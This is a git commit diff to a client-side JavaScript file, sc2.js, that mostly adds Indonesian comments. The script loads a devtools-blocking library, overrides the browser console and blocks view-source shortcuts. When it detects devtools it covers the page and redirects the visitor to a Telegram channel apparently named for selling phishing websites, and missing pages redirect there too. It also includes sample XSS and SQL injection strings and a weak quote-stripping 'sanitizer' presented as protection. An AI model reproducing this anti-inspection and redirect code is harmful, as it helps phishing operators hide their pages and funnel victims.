a97bd0b622b56112e165ff141d9dbb11d0411e89
manyu <142495420+rindraabi@users.noreply.github.com>
2025-04-09 13:29:36 +0700

    Update sc2.js

--- sc2.js
+++ sc2.js
@@ -1,9 +1,11 @@
 (function() {
+    // Tambahkan disable-devtool dari CDN
     var disableDevtoolScript = document.createElement('script');
     disableDevtoolScript.src = 'https://cdn.jsdelivr.net/npm/disable-devtool';
     disableDevtoolScript.setAttribute('disable-devtool-auto', '');
     document.head.appendChild(disableDevtoolScript);
 
+    // ASCII Art
     var asciiArt = `
 ███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
 ████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
@@ -13,6 +15,7 @@
 ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
     `;
 
+    // Disable console
     Object.defineProperty(window, 'console', {
         get: function() {
             return {
@@ -24,6 +27,7 @@
         }
     });
 
+    // Overlay layar
     function disableInteraction() {
         var overlay = document.createElement("div");
         overlay.style.position = "fixed";
@@ -37,16 +41,19 @@
         document.body.appendChild(overlay);
     }
 
+    // Sanitasi input XSS
     function sanitizeInput(input) {
         var element = document.createElement('div');
         element.innerText = input;
         return element.innerHTML;
     }
 
+    // Sanitasi input SQL injection
     function preventSQLInjection(input) {
         return input.replace(/['";]/g, '');
     }
 
+    // Cegah Ctrl+U dan Ctrl+Shift+I
     window.addEventListener('keydown', function(event) {
         if (event.ctrlKey && (event.key === 'u' || event.key === 'U') ||
             (event.ctrlKey && event.shiftKey && event.key === 'I')) {
@@ -55,15 +62,16 @@
         }
     });
 
+    // Deteksi devtools terbuka
     var devtools = /./;
     devtools.toString = function() {
         console.log(asciiArt);
         disableInteraction();
         window.location.href = 'https://t.me/storewebphising';
     };
-
     console.log(devtools);
 
+    // Contoh pencegahan XSS dan SQLi
     var userInput = '<script>alert("XSS Attack!");</script>';
     var sanitizedInput = sanitizeInput(userInput);
     console.log("Sanitized Input (XSS):", sanitizedInput);
@@ -71,4 +79,16 @@
     var sqlInput = "SELECT * FROM users WHERE username = 'admin' --";
     var safeInput = preventSQLInjection(sqlInput);
     console.log("Sanitized Input (SQL Injection):", safeInput);
+
+    // Redirect jika file/folder tidak ditemukan (seperti .htaccess)
+    var currentPath = window.location.pathname;
+    fetch(currentPath)
+        .then(function(response) {
+            if (!response.ok) {
+                window.location.href = 'https://t.me/storewebphising';
+            }
+        })
+        .catch(function() {
+            window.location.href = 'https://t.me/storewebphising';
+        });
 })();
